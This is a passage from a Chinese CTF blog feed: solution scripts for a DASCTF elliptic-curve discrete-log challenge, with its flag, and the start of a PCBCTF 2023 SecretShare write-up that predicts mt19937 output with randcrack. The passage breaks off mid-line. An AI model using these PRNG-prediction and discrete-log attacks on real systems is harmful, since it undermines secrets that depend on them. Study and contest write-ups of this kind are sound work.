punctuation\">(</span>xp<span class=\"token operator\">^</span><span class=\"token number\">2</span> <span class=\"token operator\">-</span> ecc<span class=\"token punctuation\">.</span>mul<span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token operator\">-</span>i<span class=\"token punctuation\">,</span>Q<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>    F<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>f<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>res<span class=\"token operator\">=</span>Ideal<span class=\"token punctuation\">(</span>F<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>groebner_basis<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>res<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>c <span class=\"token operator\">=</span> <span class=\"token operator\">-</span><span class=\"token number\">219493165434454878473973957507132663767650700404392831423708684433961924200902</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>xp <span class=\"token operator\">=</span> Zmod<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>nth_root<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">all</span><span class=\"token operator\">=</span><span class=\"token boolean\">True</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>RR<span class=\"token punctuation\">.</span><span class=\"token operator\">&lt;</span>yp<span class=\"token operator\">></span> <span class=\"token operator\">=</span> PolynomialRing<span class=\"token punctuation\">(</span>Zmod<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>f <span class=\"token operator\">=</span> xp<span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>a<span class=\"token operator\">*</span>yp<span class=\"token operator\">^</span><span class=\"token number\">2</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> yp<span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>b<span class=\"token operator\">*</span>xp<span class=\"token operator\">^</span><span class=\"token number\">2</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>yp <span class=\"token operator\">=</span> f<span class=\"token punctuation\">.</span>roots<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>P <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>xp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>yp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>E <span class=\"token operator\">=</span> EllipticCurve<span class=\"token punctuation\">(</span>GF<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span>a<span class=\"token operator\">+</span>b<span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span>a<span class=\"token operator\">*</span>b<span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>E<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre></pre></td></tr><tr><td data-num=\"71\"></td><td><pre>g <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>b<span class=\"token operator\">*</span>G<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> a<span class=\"token operator\">*</span>G<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span> inverse_mod<span class=\"token punctuation\">(</span>G<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token operator\">-</span>G<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>p<span class=\"token punctuation\">)</span><span class=\"token operator\">%</span>p<span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span>b<span class=\"token operator\">-</span>a<span class=\"token punctuation\">)</span><span class=\"token operator\">*</span>inverse_mod<span class=\"token punctuation\">(</span>G<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token operator\">-</span>G<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>p<span class=\"token punctuation\">)</span><span class=\"token operator\">%</span>p<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre>q <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>b<span class=\"token operator\">*</span>P<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> a<span class=\"token operator\">*</span>P<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span> inverse_mod<span class=\"token punctuation\">(</span>P<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token operator\">-</span>P<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>p<span class=\"token punctuation\">)</span><span class=\"token operator\">%</span>p<span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span>b<span class=\"token operator\">-</span>a<span class=\"token punctuation\">)</span><span class=\"token operator\">*</span>inverse_mod<span class=\"token punctuation\">(</span>P<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token operator\">-</span>P<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>p<span class=\"token punctuation\">)</span><span class=\"token operator\">%</span>p<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"73\"></td><td><pre></pre></td></tr><tr><td data-num=\"74\"></td><td><pre>g <span class=\"token operator\">=</span> E<span class=\"token punctuation\">(</span>g<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"75\"></td><td><pre>q <span class=\"token operator\">=</span> E<span class=\"token punctuation\">(</span>q<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"76\"></td><td><pre><span class=\"token comment\"># 做映射之后的阶是不会变的</span></pre></td></tr><tr><td data-num=\"77\"></td><td><pre></pre></td></tr><tr><td data-num=\"78\"></td><td><pre>primes <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">3</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">5</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">16</span><span class=\"token punctuation\">,</span> <span class=\"token number\">37</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">271</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">4297</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">6983</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">9679</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">52631</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">139571</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">84666937</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">558977989</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"79\"></td><td><pre>logs<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"80\"></td><td><pre><span class=\"token keyword\">for</span> fac <span class=\"token keyword\">in</span> primes<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"81\"></td><td><pre>    t<span class=\"token operator\">=</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>order<span class=\"token punctuation\">)</span><span class=\"token operator\">//</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>fac<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"82\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'ok'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"83\"></td><td><pre>    log<span class=\"token operator\">=</span>discrete_log<span class=\"token punctuation\">(</span>t<span class=\"token operator\">*</span>q<span class=\"token punctuation\">,</span>t<span class=\"token operator\">*</span>g<span class=\"token punctuation\">,</span>operation<span class=\"token operator\">=</span><span class=\"token string\">'+'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"84\"></td><td><pre>    logs<span class=\"token operator\">+=</span><span class=\"token punctuation\">[</span>log<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"85\"></td><td><pre>m <span class=\"token operator\">=</span> crt<span class=\"token punctuation\">(</span>logs<span class=\"token punctuation\">,</span>primes<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"86\"></td><td><pre></pre></td></tr><tr><td data-num=\"87\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"88\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>long_to_bytes<span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"89\"></td><td><pre><span class=\"token comment\"># DASCTF&#123;goodathuff&#125;</span></pre></td></tr></table></figure><p>分类: <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vWmltYUJsdWUvY2F0ZWdvcnkvMjIwMjk5Ny5odG1s\">WriteUp</span></p>\n<p>标签: <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vWmltYUJsdWUvdGFnL2NyeXB0by8=\">crypto</span> , <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vWmltYUJsdWUvdGFnL3dyaXRldXAv\">writeup</span></p>\n",
            "tags": []
        },
        {
            "id": "http://waltcsz.github.io/2023/12/",
            "url": "http://waltcsz.github.io/2023/12/",
            "title": "",
            "date_published": "2023-12-05T15:22:33.439Z",
            "content_html": "<h1 id=\"pcbctf-2023\"><a class=\"markdownIt-Anchor\" href=\"#pcbctf-2023\">#</a> <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vWmltYUJsdWUvYXJ0aWNsZXMvMTc4MTI5MDUuaHRtbA==\"> PCBCTF 2023 </span></h1>\n<p>2023 年鹏城杯网络安全技能竞赛。</p>\n<h2 id=\"secretshare\"><a class=\"markdownIt-Anchor\" href=\"#secretshare\">#</a> SecretShare</h2>\n<p>首先最后一个 x 没给，但用 mt19937 可预测，那么 R 和 X 都齐全了，用<span class=\"exturl\" data-url=\"aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC80NDA2NjcyMjc=\"> shamir 矩阵计算法</span>来求解即可。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> random</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> randcrack <span class=\"token keyword\">import</span> RandCrack</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>leak <span class=\"token operator\">=</span> <span class=\"token number\">158171468736013100218170873274656605219228738469715092751861925345310881653082508445746109167302799236685145510095499361526242392251594397820661050281094210672424887670015189702781308615421102937559185479455827148241690888934661637911906309379701856488858180027365752169466863585611322838180758159364570481257</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>p <span class=\"token operator\">=</span> <span class=\"token number\">667548632459029899397299221540978856425474915828934339291333387574324630349258515018972045406265448494845331262999241448002076917383740651362641947814545076390796789402373579283727117618532504865966299599663825771187433223531022829811594806917984414530614469374596457149431218829297339079019894262229453357029</span>   </pre></td></tr><tr><td data-num=\"7\"></td><td><pre>c <span class=\"token operator\">=</span> <span class=\"token number\">9658009093151541277762773618550582280013680172161026781649630205505443184765264518709081169475689440555639354980432557616120809346519461077355134139495745998317849357705381020225760061125236265304057301286196004542729553944161451832173970613915423841610378207266606500956362098150141825329354727367056070349148059780287916811442861961254066733726576151134458892613951223277692935141880749737598416235307087782001086096114978527447987308876878393763055893556123029990282534497668077854186604106027698257663251502775547705641708624619340185646943640576690633662704397191379303254341343433077302686466850600522990402912</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>N <span class=\"token operator\">=</span> <span class=\"token number\">11790604055677230214731474049594783873473779547159534481643303694816346271798870343160061559787963631020684982858033776446193418629055210874285696446209220404060653230407249409973790191858423402504530660556839353260629987853933304089439885784684686555554108157760445567974629355878575105480273451284714281430590737346099023372211403461861104391534461524711472734572409128196536805998116015230502045333769525693468193385557827209520108839913096017750428926467123493650506193757937746017474062985480713594474378324234033232933140389879312722642144536418253323908290256009510135710208223393009237664704631175216240376891</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>s<span class=\"token operator\">=</span><span class=\"token triple-quoted-string string\">'''27322282703709511636610535806856853612612796524565963685352821215367702697670029638291472271242231649191714479260517868076984065989639273952206721225394449809512736309152963717666213669565294618889004878502587203292128915123582846437035618297859622373514552659661751919687138158714389205196365694996691846589 48569244180151557205855904296808011040310995626104180491157243372509052545941856322458676083637192423759673249488348244220016168699221727901608142636001227515271570470832957720323162015971262916929310707561503164723954043820660896942792324593262461443662124187475159194385198887788939215142063719188348359051</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>91805670014258342004112051538515158497977951249015335208828337677065661825541672701641011001509677094927054079355384880161339840664535548572711525978354947655159331190183669338379535914171636373271711777662899462412133698069202075760175522929409084089926367963132890460921167025666146228784502671381146711019 399560428917764748532974912549579755263000603891290776423346071350694440330590365031312031331274402458285677563081638572382883720599282186196046608483533823720739712120092762382758124206813101015928952314835833408960456083078746116580899849811889743359253318716527623535224217277574914341453477162101109304521</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>66920426958285786458658248767160362920977647430969423155679844462544037512659182174429654322739226216034435833627040279237803034255254749729584723025199164153117416758037930376665769001615518843769072788984118288795594844920830871790000441610452127329422157793240336858492947908675187651204641324347460068225 544937610110319318485732752819003299421900030583201619755186005418563198983178922830516722630658659738570688423587906326520697827239870483140381321035311084086872965680985895264808839131965351704781276541438910273061170401708989341983455583148675268945159916067944049744805262336310315984482684477033006734287</pre></td></tr><tr><td data-num=\"13\"></td><td><pre>5635003138990118507194506070175086831788576611651929217926664518872856396687497543355452282932759792957815071333069987192436081970967301109108636547955400620912244311244917063515500624803643902206301188548901042409824866123277584384961209855675044800618682367677428510425729333590673520619706804051348640739 216744037211012509915361607447276981890614637104708083303422302996997658600655325492799426696396129495740380030328486134561677905050895542824084902986133831827678164847190414920208201189028697970734101241668427915881431218718486605095651504942024880541330783245275847421981881418579001271393784051391703426641</pre></td></tr><tr><td data-num=\"14\"></td><td><pre>42911212495890251189243677773682023641022813626312578449123776026147091248993904833237700742589532896024024290404122897946672451644535270088285040557715419433742408043822628453894022912746599564701384030731888203683342200542550299021286164291609827209395613247858235556551967071480178477133096158123879827699 358625812085590413825860316781088505612223852757468112073999439178735803245018313087878704846077887688463179850461438873261474235563220723161414348183847290126780153336526214025645436877174640254582752642464699350692290355463838062957644227630261763964930791440438099097640358707938365934460765509770713422802</pre></td></tr><tr><td data-num=\"15\"></td><td><pre>76393649631519338646914577444953093042692772742019473672660460181129677128343169843350211463697634615281051117955282687134957585026912161500321667521577171255986824727912674810018184784281896427202094684250866650111325600908495879530295097533881586073569958225485019114664641193908557023741440163457101525203 329857997030576972729986815876777011654061886138716155424533348668225264710995265453134377944058890193085147694227229106567976594481366856016163332702128728982600129466565167735283489379015199424332093096162272256722421083932784837620468049877168507039726118947169347011547142986416984741443370137649949904461</pre></td></tr><tr><td data-num=\"16\"></td><td><pre>79331720524907914908041917436319036255433828287857696014126718015259444328868691897077115926451094233087906865422458137916362681754241848523015955481140065721679824678490152910531795497192050173146826300375546645932629884190392808650921115445830421927238985963684104496062702531620988113510613763043301631209 521812627987763620197812504899506910796946504850708570349667428211492401785051233252744740254058319678959842396710646375803470815528610618211136953181796072686187773678649762524131730689630306575027480171902373722358678386430941181209464823845330723780859962168995759134414896419704465387883718956885830089204</pre></td></tr><tr><td data-num=\"17\"></td><td><pre>34982047515239854027766260430773762615551551624040650169394931537920509836795394460680530502277933252344187876902284046236616780767724165813414385632503982500888235012434695560644146038269348824756839799255778718600829638272259933042402900324341026396868817418250681063616205184019449176410323763562609906256 620605218346899770429088593442355698411635752845778736545505196875522232769153705673917137123151382118878693457232039690080398947092819660645917999264381455940649845030563994094759265923737413658758514560434230280086651591011706752452769554749328591613510563389443179182520711924593818729897121279090347342924</pre></td></tr><tr><td data-num=\"18\"></td><td><pre>152419925215633402551037300484006425703951620959940334562270582763998688826301000834158083436618204487451531847804246279293440954881219913553470971941979760351736535195521294640333019382215259554425750740788262905693120027837778006639912907313405166887419201498400381605572044667968915799849914769886304855469 534016646028730727016209888504911167747835078463480349483097394578844831015450227232096300754745773717118904569821782762146568167060585024245190142726454552015507956174745334336178848983708347742569471390328051491668238788357493167057460607669219247924675410096486695085439718252206048534436114032676610106347</pre></td></tr><tr><td data-num=\"19\"></td><td><pre>7879488845815070796446980042322339499701160196159748256186513316298957679171765636643576866967308539398870809808590995575054707633585889782359230149070757943670854204408729244422811261494912348733104477093541158692065916137178255072991528458124264991587844119002172895462900656781795781239777162351236329010 88871679849011995091477347542680893996957786653924621705917895209560005458566552006873467270402185918706978818367798743110976595300781848502254399030378598802075501163781912730014790884964070072432678736909128727529050058640555516131888412874572332236693843543870582425734398659970857777429709921292338764056</pre></td></tr><tr><td data-num=\"20\"></td><td><pre>127514038284722450386599280575918286761060061225148526034466492640545892790142008459404252129894996614536417849770574953585543450549469396103606474736901175227788222676384874264401431651217507860669506781393523454290522077615631381023377385798837961138591946856445250933293025411868935836885350047926486897489 77024841353020037736072564671223528105040202905964518913084686725674447555778849580882283151820241410917813178127609045792603404416216635536183501218256797138848233777386900397758052436048023588018973775841429672943588531118120531410941119451112420484244073744860360930771612798228353879418110447613074103121</pre></td></tr><tr><td data-num=\"21\"></td><td><pre>73523397212562449962797322407800812476585158706372414597501601851658987192829920809491154804458216832212324494892234069944533082031068984251998442644045753330748501446440305199570609290581400456976816997103538669480916305434314437973807842397862244118575425198027445648296131215572682266387781847672276278105 358131172545144245017725954943677533669555698100417873957892816178502113778385580423968891034087567143540060215845324391804373505677355257229040486254496477702089813554705646138200115877254745085768546159462550014224359419574896275660358462631189412166193397952134507043404147073495973377634175173793168251233</pre></td></tr><tr><td data-num=\"22\"></td><td><pre>147348014782035263557672447461924770257688598176948741569841957313948631675235455168853571742962013610522674191595258437726941866803703946285611136667070559549648062172513441677274884328986422767953568184453855423313870118663236611714535321243624425127415452246621538957156768109051856015526921750034402814181 595636882372433751112400377321820719222073583356736222414778628384644623278463447644996314505722523949309416112422725194730843858188224367723911893838329601709038981556011159397788345709995936511801237268248578658463705897357408752571102163768839107050797667376601808299838509114230891979045461260911946415320</pre></td></tr><tr><td data-num=\"23\"></td><td><pre>107396275167806069862891568873373042687841775147343147252292584080352003252925523814251826627764872245643578589633919368796490434000761591564932634968812847926559005905574630301932715978159346119216934096015784765061798867698507880003720720252714582289061793936959096457352973294797409716470781535683208662390 395153432543738329086362624068574193255148332584492341243454102818775521905404929692387305225461869410602734064349062513722129355095148212452014041134124275764033437990333449975234478218955405224252839531173866658663372361601107447751367104423527019655871175001744848253584734158351726745551407103825286804486</pre></td></tr><tr><td data-num=\"24\"></td><td><pre>111553464316331929637928443274530253217732988900086332463018159619552721468104642096142476958790984335379754112570481423047457696400188847850295271972015619208861578167810076654492163584804626343101458265888573313262592215690879907819608901681957001286346406746245896172209892822686784252329450759497940157817 511651161619212591638982125008326295422605195202233521320827338823708335474320214987121320809834264020752488400694820412703895872293388034242395958165882000777796549830919064001864919411540442573874044781198129468230793584507078981976925332170577699344654086418908951152825866266645119298895702972413286583958</pre></td></tr><tr><td data-num=\"25\"></td><td><pre>152943203796417374728939496393486026220901654584673108139041097288333960510566510856084351323729904924640199712274885275910827036984793221821982353991291820643933058458639690879406578278096815789977814737418245161029735350306516366692394206323956675431185964629143452067819609148096407834611672577927865412392 601919715680710925447421076338078877766683489886991843150153117466383328925764100913643134608445665513170565014760605822708267601346612031986281277217875335899155526135282569237278337539198315798958944970975021604720637053079350115793916435033122479416157536224071649845398032404766802667331247026412465230897</pre></td></tr><tr><td data-num=\"26\"></td><td><pre>166939346435092804149361985966477026395490869535977170373479116381554623702088662590719710620315106535772321371981485114999353813392487182004380368980412304867141197881584179316802946420573712884869207029807032629508803275758495901655593573546020371363238621118513519707566850164838945538265367877703756561143 234820987787318061334406237477763453845428872967687650137534289159784627741552971152526376041477941966693305257682995443922827379938186523574311761092208293391813942996139561570362972331975732091581332378414745250571717259039007898729580445364373819332663464831222506646891337600543033325723536694430603794811</pre></td></tr><tr><td data-num=\"27\"></td><td><pre>26423433781831557303965218555715659459964805457875828323769054957811368313465747671809917056868138188812894920739462390440860614780050790166810205409831687879766298929374237068956851330280802672993787657036328401560347701569533751904003924033296103431436132762238032533631035466975563403490612905290747500034 564564388847953966153849841262670748320376369154008357907963983929690302350574296789978591185246923974920161797995189321841257011791368992972604074119872162539552292552362460968499190796503841035750507639233595470833894116053816701560762298879109510469040808411623441894361241720213857716595525048872499260906</pre></td></tr><tr><td data-num=\"28\"></td><td><pre>67047973882442026847054596043723251652019181826511387455752441275468608245799296406017022023236054643173589545621722148324431435563020855357273526765167504290556087855144498047600331414488129605467552541562176094510433084299150667280746009871632940612151871433089450237469253872190728223812058292760792048327 190023992656957817692909813007060815279103259429273681430127196398700351704377473750794054807013341268132331757606642253453911294388801612173064841530999650755116853772677649649669913317951539550313189351839325961495963700012333982508285993230904890545000476087981313109451079110864357972818329854737276461934</pre></td></tr><tr><td data-num=\"29\"></td><td><pre>105924866908333941056520542136279835222849349889633638544229314020165638653054683617844504431167584527725854457445810982830025832114705779346552001573819055283000133195971409988231558773967828820675125138322725072735898886865540351014422681184954059397593545246946913932272750078695992276555307091275819914167 590597067702351181983043135203878889479903130263737024839941242154123057325926009112777887235038694551309864253859910817785607380293492455212053557033975616644911248422981687394189486917578693691299595122658518879946708562394161159104748320544408107959224087679644857953504156164164979544525935685064483284685</pre></td></tr><tr><td data-num=\"30\"></td><td><pre>'''</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>X <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>R <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> s<span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token string\">'\\n'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>    x<span class=\"token punctuation\">,</span>r<span class=\"token operator\">=</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token string\">' '</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token string\">' '</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>    X<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>    R<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>r<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>x <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> X<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>    t <span class=\"token operator\">=</span> <span class=\"token builtin\">bin</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>zfill<span class=\"token punctuation\">(</span><span class=\"token number\">1024</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>    temp <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>    <span class=\"token keyword\">for</span> j <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">32</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>        temp<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>t<span class=\"token punctuation\">[</span>j<span class=\"token operator\">*</span><span class=\"token number\">32</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">(</span>j<span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">32</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>    x<span class=\"token punctuation\">.</span>extend<span class=\"token punctuation\">(</span>temp<span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>rc<span class=\"token operator\">=</span>RandCrack<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> x<span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token number\">624</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>    rc<span class=\"token punctuation\">.</span>submit<span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">[</span><span class=\"token number\">624</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>    <span class=\"token keyword\">assert</span> <span class=\"token punctuation\">(</span>rc<span class=\"token punctuation\">.</span>predict_getrandbits<span class=\"token punctuation\">(</span><span class=\"token number\">32</span><span class=\"token 